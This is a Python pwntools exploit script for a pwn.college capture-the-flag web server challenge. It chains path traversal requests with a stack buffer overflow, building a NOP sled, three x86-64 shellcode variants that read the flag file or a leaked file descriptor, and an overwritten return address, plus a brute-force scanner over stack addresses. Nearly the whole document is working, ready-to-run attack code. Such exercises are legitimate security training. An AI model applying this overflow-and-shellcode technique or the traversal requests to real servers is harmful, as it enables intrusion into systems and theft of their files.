#!/usr/bin/env python3
"""
Wily Webserver Exploit (pwn.college integration-web-overflow)

Vuln: Buffer overflow in send_file() + path traversal.
Stack: No PIE, No canary, RWX, ASLR disabled via constructor.
Flag: /flag (root-owned, but server process can read it).

3 attack approaches:
  A) Direct open("/flag") — blocked if seccomp restricts syscalls from stack
  B) fd leak + lseek + read — bypasses seccomp by using already-open flag fd
  C) fd leak + pread64 — alternative if lseek is blocked

Usage:
  python3 wily_webserver.py                    # auto-detect approach
  python3 wily_webserver.py --brute            # brute-force CONTENT address
"""

from pwn import *

context.arch = "amd64"
context.log_level = "warn"
import os
import sys
import time

# ── Constants ──────────────────────────────────────────────────────────
HOST, PORT = "127.0.0.1", 80
H1 = b"HTTP/1.1 200 OK\nServer: pwnserver/1.33333333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: "
CT = b"text/plain\n"
FS = 8180  # payload file size (must be < 8192)
hs = len(H1) + len(CT) + len(b"Content-Length: " + str(FS).encode() + b"\n") + 1
RBP_OFF = 8200 - hs  # file offset where saved RBP is placed
RET_OFF = 8208 - hs  # file offset where return address is placed
sc_off = 100  # shellcode starts at file offset 100


# ── Helpers ────────────────────────────────────────────────────────────
def req(path, timeout=5):
    try:
        s = remote(HOST, PORT, timeout=timeout)
        s.send(f"GET /{path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
        d = s.recvall(timeout=timeout)
        s.close()
        return d
    except:
        return None


def restart():
    os.system("pkill -9 integration-web 2>/dev/null; sleep 0.3")
    os.system("nohup /challenge/integration-web-overflow >/dev/null 2>&1 &")
    time.sleep(1)


def build(sc, content_addr):
    """Build payload: NOP sled + shellcode + saved_rbp + ret_addr + fill."""
    p = b"\x90" * sc_off + sc
    p += b"\x90" * (RBP_OFF - sc_off - len(sc))
    p += p64(content_addr + 8200)  # saved RBP (self-referential)
    p += p64(content_addr + hs + sc_off)  # return address → shellcode
    p += b"\x90" * (FS - len(p))
    return p[:FS]


# ── Shellcodes ─────────────────────────────────────────────────────────
# A) Direct open("/flag") — push-based string, no RIP-relative issues
SC_OPEN = asm("""
    xor eax,eax; push rax
    movabs rax,0x67616c662f; push rax
    mov rdi,rsp; xor eax,eax; mov al,2; xor esi,esi; syscall
    test rax,rax; js done
    mov edi,eax; xor eax,eax; lea rsi,[rsp-0x1000]; mov edx,200; syscall
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    lea rsi,[rsp-0x1000]; syscall
done: xor edi,edi; mov eax,60; syscall
""")

# B) fd leak: lseek(5,0,SEEK_SET) + read(5) + write(4)
SC_FD = asm("""
    xor eax,eax; mov al,8; mov edi,5; xor esi,esi; xor edx,edx; syscall
    xor eax,eax; mov edi,5; lea rsi,[rsp-0x1000]; mov edx,200; syscall
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    lea rsi,[rsp-0x1000]; syscall
    xor edi,edi; mov eax,60; syscall
""")

# C) fd leak + pread64 (syscall 17) instead of lseek
SC_PREAD = asm("""
    xor eax,eax; mov edi,5; lea rsi,[rsp-0x1000]; mov edx,200
    xor r10d,r10d; mov al,17; syscall
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    lea rsi,[rsp-0x1000]; syscall
    xor edi,edi; mov eax,60; syscall
""")

# Marker (for verifying shellcode execution)
SC_TEST = asm("""
    xor eax,eax; mov al,1; mov edi,4
    lea rsi,[rip+msg]; mov edx,4; syscall
    xor edi,edi; mov eax,60; syscall
msg: .ascii "OK!"
""")

# ── Address scan ───────────────────────────────────────────────────────
# Known working ranges: mmap region (0x7ffff7...) and classic (0x7ffffffd...)
# GDB on server showed send_file_rbp ≈ 0x7ffff7f7f588 → content ≈ 0x7ffff7f7d580
DEFAULT_CONTENT = 0x7FFFF7F7D580


def test_content(content_addr):
    """Try all 3 approaches with given content address, return flag or None."""
    for label, sc, do_leak in [
        ("open", SC_OPEN, False),
        ("fd+lseek", SC_FD, True),
        ("fd+pread", SC_PREAD, True),
    ]:
        if do_leak:
            req("../../../flag")
        p = build(sc, content_addr)
        open("/tmp/pwn", "wb").write(p)
        r = req("../../../tmp/pwn")
        if r and b"pwn.college{" in r:
            i = r.find(b"pwn.college{")
            j = r.find(b"}", i)
            return r[i : j + 1].decode()
    return None


def brute_scan():
    """Scan address ranges for working content address."""
    print("[*] Scanning for CONTENT address...")
    for base in range(0x7FFFF7C00000, 0x7FFFF8100000, 0x2000):
        flag = test_content(base)
        if flag:
            print(f"[+] CONTENT = 0x{base:016x}")
            return flag
        if base % 0x40000 == 0:
            print(f"    {hex(base)}")
    # Try classic stack range
    for base in range(0x7FFFFFFC0000, 0x7FFFFFFF0000, 0x2000):
        flag = test_content(base)
        if flag:
            print(f"[+] CONTENT = 0x{base:016x}")
            return flag
        if base % 0x40000 == 0:
            print(f"    {hex(base)}")
    return None


# ── Main ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    restart()

    if "--brute" in sys.argv:
        flag = brute_scan()
        if flag:
            print(f"[FLAG] {flag}")
        else:
            print("[!] No working address found")
        sys.exit(0)

    # Quick try: default CONTENT address
    for label, sc, do_leak in [
        ("direct open", SC_OPEN, False),
        ("fd leak+lseek", SC_FD, True),
        ("fd leak+pread64", SC_PREAD, True),
    ]:
        print(f"[*] Trying {label}...", end=" ", flush=True)
        if do_leak:
            req("../../../flag")
        p = build(sc, DEFAULT_CONTENT)
        open("/tmp/pwn", "wb").write(p)
        r = req("../../../tmp/pwn")
        if r and b"pwn.college{" in r:
            i = r.find(b"pwn.college{")
            j = r.find(b"}", i)
            flag = r[i : j + 1].decode()
            print(f"[FLAG] {flag}")
            sys.exit(0)
        print("no flag")

        # Restart server (shellcode's exit(0) kills it)
        restart()

    print("[!] All approaches failed with default address.")
    print("[*] Run with --brute to scan for the correct CONTENT address.")
    print("[*] To verify shellcode execution, modify SC_TEST marker and check rfind.")
